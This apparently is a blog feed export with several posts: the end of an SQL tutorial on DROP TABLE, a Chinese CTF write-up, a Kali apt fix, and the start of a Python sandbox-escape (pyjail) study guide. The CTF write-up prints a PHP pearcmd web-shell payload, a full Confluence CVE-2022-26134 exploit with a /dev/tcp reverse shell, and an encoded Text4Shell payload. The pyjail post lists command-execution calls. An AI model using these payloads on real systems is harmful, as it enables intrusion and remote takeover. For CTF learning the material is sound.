<p><strong>2.</strong> Deal with any <strong>NULL</strong> values that you find. (Delete those records; update the column’s value, and so on.)</p>
<p><strong>3.</strong> Issue the <strong>ALTER TABLE</strong> command.</p>
<p><strong>NOTE:</strong> Some database management systems allow the use of the <strong>MODIFY</strong> Clause; others do not. Still others have added other clauses to the <strong>ALTER TABLE</strong> statement. In Oracle, you can even alter the table’s storage parameters. Check the documentation of the system you are using to determine the implementation of the <strong>ALTER TABLE</strong> statement.</p>
<p><strong>The DROP TABLE Statement</strong></p>
<p>SQL provides a command to completely remove a table from a database. The <strong>DROP TABLE</strong> command deletes a table along with all its associated views and indexes. After this command has been issued, there is no turning back. The most common use of the <strong>DROP TABLE</strong> statement is when you have created a table for temporary use. When you have completed all operations on the table that you planned to do, issue the <strong>DROP TABLE</strong> statement with the following syntax:</p>
<p><strong>SYNTAX:</strong></p>
<p>DROP TABLE table_name;</p>
<p>Here’s how to drop the <strong>NEW_BILLS</strong> table:</p>
<p><strong>INPUT/OUTPUT:</strong></p>
<p>SQL&gt; <strong>DROP TABLE NEW_BILLS;</strong></p>
<p>Table dropped.</p>
<p><strong>ANALYSIS:</strong></p>
<p>Notice the absence of system prompts. This command did not ask <strong>Are you sure? (Y/N)</strong>. After the <strong>DROP TABLE</strong> command is issued, the table is permanently deleted.</p>
<p><strong>WARNING:</strong> If you issue</p>
<p>SQL&gt; DROP TABLE NEW_BILLS;</p>
<p>you could be dropping the incorrect table. When dropping tables, you should always use the owner or schema name. The recommended syntax is</p>
<p>SQL&gt; DROP TABLE OWNER.NEW_BILLS;</p>
<p>We are stressing this syntax because we once had to repair a production database from which the wrong table had been dropped. The table was not properly identified with the schema name. Restoring the database was an eight-hour job, and we had to work until well past midnight.</p>
<p><strong>The DROP DATABASE Statement</strong></p>
<p>Some database management systems also provide the <strong>DROP DATABASE</strong> statement, which is identical in usage to the <strong>DROP TABLE</strong> statement. The syntax for this statement is as follows:</p>
<p>DROP DATABASE database_name</p>
<p><strong>NOTE:</strong> The various relational database implementations require you to take different steps to drop a database. After the database is dropped, you will need to clean up the operating system files that compose the database.</p>
<p><strong>Exercise 9.2</strong></p>
<p>Create a database with one table in it. Issue the <strong>DROP TABLE</strong> command and the issue the <strong>DROP DATABASE</strong> command. Does your database system allow you to do this? Single-file based systems, such as Microsoft Access, do not support this command. The database is contained in a single file. To create a database, you must use the menu options provided in the product itself. To delete a database, simply delete the file from the hard drive.</p>
<p><strong>Summary</strong></p>
<p>It covers the major features of SQL’s Data Manipulation Language (DML). In particular, you learned five new statements: <strong>CREATE DATABASE</strong>, <strong>CREATE TABLE</strong>, <strong>ALTER TABLE</strong>, <strong>DROP TABLE</strong>, and <strong>DROP DATABASE</strong>. It also discusses the importance of creating a good database design.</p>
<p>A data dictionary is one of the most important pieces of documentation you can create when designing a database. This dictionary should include a complete description of all objects in the database: tables, fields, views, indexes, stored procedures, triggers, and so forth. A complete data dictionary also contains a brief comment explaining the purpose behind each item in the database. You should update the data dictionary whenever you make changes to the database.</p>
<p>Before using any of the data manipulation statements, it is also important to create a good database design. Break down the required information into logical groups and try to identify a primary key field that other groups (or tables) can use to reference this logical group. Use foreign key fields to point to the primary or foreign key fields in other tables.</p>
<p>You learned that the <strong>CREATE DATABASE</strong> statement is not a standard element within database systems. This variation is primarily due to the many different ways vendors store their databases on disk. Each implementation enables a different set of features and options, which results in a completely different <strong>CREATE DATABASE</strong> statement. Simply issuing <strong>CREATE DATABASE database_name</strong> creates a default database with a default size on most systems. The <strong>DROP DATABASE</strong> statement permanently removes that database.</p>
<p>The <strong>CREATE TABLE</strong> statement creates a new table. With this command, you can create the fields you need and identify their data types. Some database management systems also allow you to specify other attributes for the field, such as whether it can allow <strong>NULL</strong> values or whether that field should be unique throughout the table. The <strong>ALTER TABLE</strong> statement can alter the structure of an existing table. The <strong>DROP TABLE</strong> statement can delete a table from a database.</p>
<p><strong>Q&amp;A</strong></p>
<p><strong>Q Why does the</strong> <strong>CREATE DATABASE</strong> <strong>statement vary so much from one system to another?</strong></p>
<p><strong>A</strong> <strong>CREATE DATABASE</strong> varies because the actual process of creating a database varies from one database system to another. Small PC-based databases usually rely on files that are created within some type of application program. To distribute the database on a large server, related database files are simply distributed over several disk drives. When your code accesses these databases, there is no database process running on the computer, just your application accessing the files directly. More powerful database systems must take into account disk space management as well as support features such as security, transaction control, and stored procedures embedded within the database itself. When your application program accesses a database, a database server manages your requests (along with many others’ requests) and returns data to you through a sometimes complex layer of middleware.</p>
<p><strong>Q Can I create a table temporarily and then automatically drop it when I am done with it?</strong></p>
<p><strong>A</strong> Yes. Many database management systems support the concept of a temporary table. This type of table is created for temporary usage and is automatically deleted when your user’s process ends or when you issue the <strong>DROP TABLE</strong> command.</p>
<p><strong>Q Can I remove columns with the</strong> <strong>ALTER TABLE</strong> <strong>statement?</strong></p>
<p><strong>A</strong> No. The <strong>ALTER TABLE</strong> command can be used only to add or modify columns within a table. To remove columns, create a new table with the desired format and then select the records from the old table into the new table.</p>
]]></content>
      <categories>
        <category>SQL</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>SQL</tag>
      </tags>
  </entry>
  <entry>
    <title>【Realworld体验赛】--Writeup</title>
    <url>/2023/01/Realworld%E4%BD%93%E9%AA%8C%E8%B5%9B-Writeup/</url>
    <content><![CDATA[<p>Realworld-CTF太人性化了，知道国际赛不是谁都能解题的，直接上了一个体验赛（ps：40%正赛难度）让我这种fw也有能玩的地方了，QEQ。没环境复现了，就贴一下比赛写的不是很详细的wp。 ：（</p>
<span id="more"></span>
<h1 id="be-a-language-expert"><a class="markdownIt-Anchor" href="#be-a-language-expert"></a> Be-a-Language-Expert</h1>
<h2 id="解题过程"><a class="markdownIt-Anchor" href="#解题过程"></a> 解题过程</h2>
<p>原本的poc打的是<code>/var/www/html/</code>这个路径，这里打不了，直接打<code>/tmp/</code></p>
<p>POC</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">?lang=..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../u</span>sr<span class="regexp">/local/</span>lib<span class="regexp">/php/</span>pearcmd&amp;+config-create+<span class="regexp">/%/</span>&lt;?=@eval(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;TW&#x27;</span>]);?&gt;+<span class="regexp">/tmp/</span>TWe1v3.php</span><br></pre></td></tr></table></figure>
<p>设置Cookie</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">Cookie: think_lang=zh-cn..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../u</span>sr<span class="regexp">/local/</span>lib<span class="regexp">/php/</span>pearcmd</span><br></pre></td></tr></table></figure>
<p><img src="/2023/01/Realworld%E4%BD%93%E9%AA%8C%E8%B5%9B-Writeup/1.png" alt="1"></p>
<p>蚁剑直接连：<a href="http://ip">http://ip</a>:port/index?lang=…/…/…/…/…/…/…/…/…/…/tmp/TWe1v3</p>
<p><code>shell：TW</code></p>
<p><img src="/2023/01/Realworld%E4%BD%93%E9%AA%8C%E8%B5%9B-Writeup/2.png" alt="2"></p>
<p>连上直接<code>./readflag</code></p>
<h1 id="be-a-wiki-hacker"><a class="markdownIt-Anchor" href="#be-a-wiki-hacker"></a> Be-a-Wiki-Hacker</h1>
<h2 id="解题过程-2"><a class="markdownIt-Anchor" href="#解题过程-2"></a> 解题过程</h2>
<p><strong>CVE-2022-26134</strong>直接github上搜exp</p>
<p>找到弹shell的exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="comment"># cve2022-26134</span></span><br><span class="line"><span class="comment"># by: lxxl</span></span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line"></span><br><span class="line">urllib3.disable_warnings()</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">url</span>):</span><br><span class="line">    r = requests.get(url + <span class="string">&quot;/login.action&quot;</span>, verify=<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">if</span> (r.status_code == <span class="number">200</span>):</span><br><span class="line">        filter_version = re.findall(<span class="string">&quot;&lt;span id=&#x27;footer-build-information&#x27;&gt;.*&lt;/span&gt;&quot;</span>, r.text)</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">len</span>(filter_version) &gt;= <span class="number">1</span>):</span><br><span class="line">            version = filter_version[<span class="number">0</span>].split(<span class="string">&quot;&#x27;&gt;&quot;</span>)[<span class="number">1</span>].split(<span class="string">&#x27;&lt;/&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">return</span> version</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> url</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>(<span class="params">url, command</span>):</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;*/*&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    r = requests.get(</span><br><span class="line">        url + <span class="string">&#x27;/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22&#x27;</span> + command + <span class="string">&#x27;%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/&#x27;</span>,</span><br><span class="line">        headers=headers, verify=<span class="literal">False</span>, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">if</span> (r.status_code == <span class="number">302</span>):</span><br><span class="line">        <span class="keyword">return</span> r.headers[<span class="string">&#x27;X-Cmd-Response&#x27;</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shell</span>():</span><br><span class="line">        shell = ip + <span class="string">&quot;/&quot;</span> + port</span><br><span class="line">        shell1 = <span class="string">&quot;&#x27;bash&#x27;,&#x27;-c&#x27;,&#x27;bash -i &gt;&amp; &quot;</span></span><br><span class="line">        exp = shell1 + <span class="string">&quot;/dev/tcp/&quot;</span>  + shell + <span class="string">&quot; 0&gt;&amp;1&#x27;&quot;</span></span><br><span class="line">        payload1 = <span class="string">&#x27;&#x27;&#x27;$&#123;new javax.script.ScriptEngineManager().getEngineByName(&quot;nashorn&quot;).eval(&quot;new java.lang.ProcessBuilder().command(&#x27;&#x27;&#x27;</span></span><br><span class="line">        payload2 = exp + <span class="string">&#x27;&#x27;&#x27;).start()&quot;)&#125;/&#x27;&#x27;&#x27;</span></span><br><span class="line">        payloads = payload1 + payload2</span><br><span class="line">        s = urllib.parse.quote(payloads)</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&#x27;cve2022-26134&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-u&#x27;</span>, <span class="string">&#x27;--url&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;target url&#x27;</span>, required=<span class="literal">False</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-c&#x27;</span>, <span class="string">&#x27;--command&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;command&#x27;</span>, required=<span class="literal">False</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-i&#x27;</span>, <span class="string">&#x27;--lhost&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;type&#x27;</span>, required=<span class="literal">False</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-p&#x27;</span>, <span class="string">&#x27;--lport&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;type&#x27;</span>, required=<span class="literal">False</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    cmd = args.command</span><br><span class="line">    ip = args.lhost</span><br><span class="line">    port = args.lport</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">len</span>(sys.argv) &lt; <span class="number">3</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;USE: python3 &quot;</span> + sys.argv[<span class="number">0</span>] + <span class="string">&quot; -u https://target.com -c command&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;ex: python3 &quot;</span> + sys.argv[<span class="number">0</span>] + <span class="string">&quot; -u https://target.com -i  your.ip -p your.port&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (sys.argv[<span class="number">3</span>] == <span class="string">&quot;-i&quot;</span>):</span><br><span class="line">            target = args.url</span><br><span class="line">            ip = args.lhost</span><br><span class="line">            port = args.lport</span><br><span class="line">            e = requests.get(target + shell(), verify=<span class="literal">False</span>)</span><br><span class="line">            <span class="keyword">if</span> e.status_code == <span class="number">200</span> <span class="keyword">or</span> e.status_code == <span class="number">302</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;[+] exploit success&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;[-] exploit failed&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        target = args.url</span><br><span class="line">        cmd = cmd.replace(<span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">        version = check(target)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;============ GET Confluence Version ============&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> (version):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Version: &quot;</span> + version)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Version: Not Found&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(exploit(target, cmd))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="/2023/01/Realworld%E4%BD%93%E9%AA%8C%E8%B5%9B-Writeup/172033766-fff63d00-67ae-491b-8613-f8032cb2e27f.png" alt="3"></p>
<p>自己本机或者服务器<code> nc -l xxxx</code> 监听一下，远程弹个shell</p>
<p><code>Cat /f* </code></p>
<p><img src="/2023/01/Realworld%E4%BD%93%E9%AA%8C%E8%B5%9B-Writeup/4.png" alt="4"></p>
<h1 id="apachecommandtext"><a class="markdownIt-Anchor" href="#apachecommandtext"></a> ApacheCommandText</h1>
<h2 id="解题过程-3"><a class="markdownIt-Anchor" href="#解题过程-3"></a> 解题过程</h2>
<p><strong>CVE-2022-42889</strong></p>
<p>java表达式注入漏洞</p>
<p>一开始直接用CVE的POC是不可以的，ban了<code>[script, file, url, dns]</code></p>
<p>利用base64Decoder绕过限制</p>
<p>利用RCE读取找flag的路径为<code>/readflag</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> <span class="string">&quot;$&#123;script:js:new java.util.Scanner(new java.lang.ProcessBuilder(&#x27;/bin/sh&#x27;,&#x27;-c&#x27;, &#x27;/readflag&#x27;).start().getInputStream(), &#x27;GBK&#x27;).useDelimiter(&#x27;zzc&#x27;).next()&#125;&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">exp</span> <span class="operator">=</span> <span class="string">&quot;$&#123;base64Decoder:&quot;</span> + Base64.getEncoder().encodeToString(poc.getBytes()) + <span class="string">&quot;&#125;&quot;</span>;</span><br></pre></td></tr></table></figure>
<figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line">$&#123;base<span class="number">64</span>Decoder:JHtzY<span class="number">3</span>JpcHQ<span class="number">6</span>a<span class="symbol">nM6</span>bmV<span class="number">3</span>IGphdmEudXRpbC<span class="number">5</span>TY<span class="number">2</span>FubmVyK<span class="name">G5</span>ldyBqYXZhLmxhbmcuUHJvY<span class="number">2</span>Vzc<span class="number">0</span>J<span class="number">1</span>aWxkZXIoJy<span class="number">9</span>iaW<span class="number">4</span><span class="attr">vc2</span>g<span class="symbol">nLCctYycsICcvcmVhZGZsYWcnKS5</span>zdGFydCgpLmdldElucHV<span class="number">0</span>U<span class="number">3</span>RyZWFtKCksICdHQks<span class="symbol">nKS51</span>c<span class="number">2</span>VEZWxpbWl<span class="number">0</span>ZXIoJ<span class="number">3</span>p<span class="number">6</span>YycpL<span class="name">m5</span>leHQoKX<span class="number">0</span>=&#125;</span><br></pre></td></tr></table></figure>
<h1 id="evil-mysql-server"><a class="markdownIt-Anchor" href="#evil-mysql-server"></a> Evil MySQL Server</h1>
<h2 id="解题过程-4"><a class="markdownIt-Anchor" href="#解题过程-4"></a> 解题过程</h2>
<p>利用恶意 mysql 服务端来读取文件</p>
<p><a href="https://github.com/Gifts/Rogue-MySql-Server">https://github.com/Gifts/Rogue-MySql-Server</a></p>
]]></content>
      <categories>
        <category>Writeup</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>kali升级报错没有 Release 文件</title>
    <url>/2022/09/kail%E5%8D%87%E7%BA%A7%E6%8A%A5%E9%94%99%EF%BC%9AE%20%E4%BB%93%E5%BA%93%20%E2%80%9Chttpsdownload.docker.comlinuxdebian%20kali-rolling%20Release%E2%80%9D%20%E6%B2%A1%E6%9C%89%20Release%20%E6%96%87%E4%BB%B6%E3%80%82/</url>
    <content><![CDATA[<p>写在前面，这是我在使用kali的过程中遇到的问题</p>
<span id="more"></span>
<h4 id="问题"><a class="markdownIt-Anchor" href="#问题"></a> 问题</h4>
<figure class="highlight scss"><table><tr><td class="code"><pre><span class="line">root<span class="keyword">@root</span>:~# sudo apt <span class="attribute">update</span> 命中:<span class="number">1</span> <span class="attribute">http</span>://mirrors.ustc.edu.cn/kali kali-rolling InRelease 忽略:<span class="number">2</span> <span class="attribute">https</span>://download.docker.com/linux/debian kali-rolling InRelease 错误:<span class="number">3</span> <span class="attribute">https</span>://download.docker.com/linux/debian kali-rolling Release  <span class="number">404</span>  <span class="keyword">Not</span> Found [<span class="attribute">IP</span>: <span class="number">65.8</span>.<span class="number">85.83</span> <span class="number">443</span>] 正在读取软件包列表... 完成 <span class="attribute">E</span>: 仓库 “<span class="attribute">https</span>://download.docker.com/linux/debian kali-rolling Release” 没有 Release 文件。 <span class="attribute">N</span>: 无法安全地用该源进行更新，所以默认禁用该源。 <span class="attribute">N</span>: 参见 apt-secure(<span class="number">8</span>) 手册以了解仓库创建和用户配置方面的细节。</span><br></pre></td></tr></table></figure>
<h4 id="解决办法"><a class="markdownIt-Anchor" href="#解决办法"></a> 解决办法</h4>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">root<span class="variable">@root</span><span class="symbol">:~</span><span class="comment"># cd /etc/apt/sources.list.d</span></span><br><span class="line">root<span class="variable">@root</span><span class="symbol">:/etc/apt/sources</span>.list.d<span class="comment"># ls</span></span><br><span class="line">docker.list</span><br><span class="line">root<span class="variable">@root</span><span class="symbol">:/etc/apt/sources</span>.list.d<span class="comment"># rm docker.list </span></span><br><span class="line">root<span class="variable">@root</span><span class="symbol">:/etc/apt/sources</span>.list.d<span class="comment"># apt-get update &amp;&amp; apt-get upgrade</span></span><br></pre></td></tr></table></figure>
<p>好耶散花！QWQ</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>pyjail-学习总结【CV】</title>
    <url>/2023/02/pyjail-%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%E3%80%90CV%E3%80%91/</url>
    <content><![CDATA[<p>01、什么是pyjail？02、怎么学pyjail？03、去哪学pyjail？</p>
<span id="more"></span>
<h1 id="pyjail-学习总结cv"><a class="markdownIt-Anchor" href="#pyjail-学习总结cv"></a> pyjail-学习总结【CV】</h1>
<h2 id="灵魂三问"><a class="markdownIt-Anchor" href="#灵魂三问"></a> 灵魂三问</h2>
<h3 id="什么是pyjail"><a class="markdownIt-Anchor" href="#什么是pyjail"></a> 什么是pyjail？</h3>
<p>pyjail也叫<strong>沙箱逃逸</strong>,就是在一个受限制的python环境中,绕过现在和过滤达到更高权限,或者geshell的过程。</p>
<h3 id="怎么学pyjail"><a class="markdownIt-Anchor" href="#怎么学pyjail"></a> 怎么学pyjail？</h3>
<ol>
<li>了解pyjail的概念：pyjail是一种限制Python代码执行的技术，用于防止恶意代码对系统造成损害。</li>
<li>阅读pyjail相关文档和教程：通过阅读官方文档、博客和教程，了解pyjail的工作原理和如何使用它。</li>
<li>实际操作：使用pyjail进行代码限制，并尝试绕过限制，以深入了解它的工作原理。</li>
<li>参与社区：加入pyjail的开发者社区，与其他开发者进行交流，共同学习和发展。</li>
</ol>
<h3 id="去哪学pyjail"><a class="markdownIt-Anchor" href="#去哪学pyjail"></a> 去哪学pyjail？</h3>
<ol>
<li>Github：可以在pyjail的Github页面上提交问题，提交代码，并与其他开发者进行交流。</li>
<li>Stack Overflow：可以在Stack Overflow上提问，获得关于pyjail的技术支持。</li>
<li>开源论坛：可以在开源论坛上了解有关pyjail的最新动态，与其他开发者进行交流。</li>
<li>在线会议：可以参加与pyjail相关的在线会议，与其他开发者面对面交流。</li>
</ol>
<h2 id="执行系统命令"><a class="markdownIt-Anchor" href="#执行系统命令"></a> 执行系统命令</h2>
<h3 id="导入模块"><a class="markdownIt-Anchor" href="#导入模块"></a> 【导入模块】</h3>
<p>在python中导入模块，有这样的一个流程：</p>
<blockquote>
<p>Python导入模块时，会先判断<code>sys.modules</code>是否已经加载了该模块，如果没有加载则从<code>sys.path</code>中的目录按照模块名查找<code>py</code>、<code>pyc</code>、<code>pyd</code>文件，找到后执行该文件载入内存并添加至<code>sys.modules</code>中，再将模块名称导入Local命名空间。如果<code>a.py</code>中存在<code>import b</code>，则在<code>import a</code>时<code>ab</code>两个模块都会添加至<code>sys.modules</code>中，但仅将<code>a</code>导入Local命名空间。通过<code>from x import y</code>时，则将<code>x</code>添加至<code>sys.modules</code>中，将<code>y</code>导入Local命名空间。</p>
</blockquote>
<p>除了这个常规导入模块的方式外还可以手动添加、直接执行等方式导入模块：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> xxx</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> xxx <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;xxx&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">sys.modules[<span class="string">&#x27;xxx&#x27;</span>]=<span class="string">&#x27;blacklist&#x27;</span></span><br><span class="line"><span class="keyword">del</span> sys.modules[<span class="string">&#x27;xxx&#x27;</span>]</span><br><span class="line"><span class="keyword">import</span> xxx</span><br><span class="line"></span><br><span class="line">a = <span class="built_in">open</span>(<span class="string">&#x27;/usr/lib/python3.9/xxx.py&#x27;</span>).read()</span><br><span class="line"><span class="built_in">exec</span>(a)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Python2</span></span><br><span class="line">execfile(<span class="string">&#x27;/usr/lib/python2.8/xxx.py&#x27;</span>)</span><br></pre></td></tr></table></figure>
<h3 id="危险方法"><a class="markdownIt-Anchor" href="#危险方法"></a> 危险方法</h3>
<p>有很多模块和方法可以用于执行命令或者读取文件：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">os.system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line">os.popen(<span class="string">&#x27;whoami&#x27;</span>).read()</span><br><span class="line"><span class="comment"># Python2</span></span><br><span class="line">os.popen2(<span class="string">&#x27;whoami&#x27;</span>).read()</span><br><span class="line">os.popen3(<span class="string">&#x27;whoami&#x27;</span>).read()</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">subprocess.call(<span class="string">&#x27;whoami&#x27;</span>, shell=<span class="literal">True</span>)</span><br><span class="line">subprocess.check_call(<span class="string">&#x27;whoami&#x27;</span>, shell=<span class="literal">True</span>)</span><br><span class="line">subprocess.check_output(<span class="string">&#x27;whoami&#x27;</span>, shell=<span class="literal">True</span>)</span><br><span class="line">subprocess.Popen(<span class="string">&#x27;whoami&#x27;</span>, shell=<span class="literal">True</span>)</span><br><span class="line"><span class="comment"># Python3</span></span><br><span class="line">subprocess.run(<span class="string">&#x27;whoami&#x27;</span>, shell=<span class="literal">True</span>)</span><br><span class="line">subprocess.getoutput(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line">subprocess.getstatusoutput(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line"></span><br><span class="line">platform.popen(<span class="string">&#x27;whoami&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Python2</span></span><br><span class="line">commands.getoutput(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line">commands.getstatusoutput(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line"></span><br><span class="line">timeit.timeit(<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>, number=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">bdb.os.system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cgi.os.system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line"></span><br><span class="line">importlib.import_module(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line"><span class="comment"># Python3</span></span><br><span class="line">importlib.<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pickle.loads(<span class="string">b&quot;cos\nsystem\n(S&#x27;whoami&#x27;\ntR.&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">eval</span>(<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>)</span><br><span class="line"><span class="built_in">exec</span>(<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>)</span><br><span class="line"><span class="built_in">exec</span>(<span class="built_in">compile</span>(<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Linux</span></span><br><span class="line">pty.spawn(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line">pty.os.system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 文件操作</span></span><br><span class="line"><span class="built_in">open</span>(<span class="string">&#x27;.bash_history&#x27;</span>).read()</span><br><span class="line">linecache.getlines(<span class="string">&#x27;.bash_history&#x27;</span>)</span><br><span class="line">codecs.<span class="built_in">open</span>(<span class="string">&#x27;.bash_history&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Python2</span></span><br><span class="line">file(<span class="string">&#x27;.bash_history&#x27;</span>).read()</span><br><span class="line">types.FileType(<span class="string">&#x27;.bash_history&#x27;</span>).read()</span><br><span class="line">commands.getstatus(<span class="string">&#x27;.bash_history&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 函数参数</span></span><br><span class="line">foo.__code__.co_argcount</span><br><span class="line"><span class="comment"># Python2</span></span><br><span class="line">foo.func_code.co_argcount</span><br><span class="line"></span><br><span class="line"><span class="comment"># 函数字节码</span></span><br><span class="line">foo.__code__.co_code</span><br><span class="line"><span class="comment"># Python2</span></span><br><span class="line">foo.func_code.co_code</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<h3 id="重新导入"><a class="markdownIt-Anchor" href="#重新导入"></a> 重新导入</h3>
<p>Python将一些经常用到的函数放在了<code>内建模块</code>中，这些函数无需导入即可使用（比如<code>eval</code>、<code>open</code>），这个内建模块在Python2中叫作<code>__builtin__</code>、在Python3中叫作<code>builtins</code>，这两个都需要导入才可以引用，但可以通过<code>__builtins__</code>来间接引用而无需导入（有一点区别，但问题不大）。</p>
<p>一些环境出于安全考虑会删掉<code>内建模块</code>中的危险方法：</p>
